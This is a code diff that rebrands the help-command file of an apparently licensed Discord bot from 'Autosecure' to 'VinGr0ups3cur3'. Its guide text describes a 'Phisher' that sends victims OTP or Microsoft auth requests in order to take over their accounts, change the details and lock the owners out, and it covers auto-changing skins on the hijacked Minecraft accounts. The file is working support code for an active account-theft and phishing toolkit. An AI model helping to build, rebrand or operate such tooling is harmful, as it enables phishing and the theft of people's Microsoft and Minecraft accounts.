@@ -4,7 +4,7 @@ const quicksetupmsg = require('../../../autosecure/utils/embeds/quicksetupmsg');
 
 module.exports = {
   name: 'guides',
-  description: 'Show help options for Autosecure',
+  description: 'Show help options for VinGr0ups3cur3',
   userOnly: true,
   options: [
     {
@@ -13,7 +13,7 @@ module.exports = {
       description: 'Choose an option',
       required: true,
       choices: [
-        { name: 'How does Autosecure & Phisher work', value: 'autosecure' },
+        { name: 'How does VinGr0ups3cur3 & Phisher work', value: 'autosecure' },
         { name: 'First Setup Guide', value: 'setupguide' },
         { name: 'Starting a bot', value: 'starting_bot' },
         { name: 'Securing', value: 'securing' },
@@ -50,8 +50,8 @@ module.exports = {
 
       case 'autosecure':
         embed = new EmbedBuilder()
-          .setTitle('How does Autosecure & Phisher work?')
-          .setDescription('Phisher works by asking the user for an email. It can use this email to send an OTP (one-time password) or send an auth request for the Microsoft App, without knowing extra. If this is given or accepted, this gives the bot full access to the account for about 15 minutes. This is more than enough for Autosecure to use the given details to log in, change the details, and make it so the original user cannot log back in.')
+          .setTitle('How does VinGr0ups3cur3 & Phisher work?')
+          .setDescription('Phisher works by asking the user for an email. It can use this email to send an OTP (one-time password) or send an auth request for the Microsoft App, without knowing extra. If this is given or accepted, this gives the bot full access to the account for about 15 minutes. This is more than enough for VinGr0ups3cur3 to use the given details to log in, change the details, and make it so the original user cannot log back in.')
           .setColor('#c6d2dd');
         break;
 
@@ -182,7 +182,7 @@ A config should only be used to save your personal settings. When your license e
             '• In the SSID Checker panel, click the **"Change Skin"** button.\n' +
             '• Enter any Minecraft player\'s IGN (e.g. `Dream`, `Notch`) or a direct skin image URL.\n' +
             '• Choose the model type: `classic` (Steve 4px) or `slim` (Alex 3px).\n\n' +
-            '### 2. Auto Change Skin in Autosecure\n' +
+            '### 2. Auto Change Skin in VinGr0ups3cur3\n' +
             '• Open `/settings` and toggle **"Change Skin"** to ON.\n' +
             '• Click **"Change Skin URL (set)"** to configure the skin IGN/URL applied automatically to secured accounts.'
           )
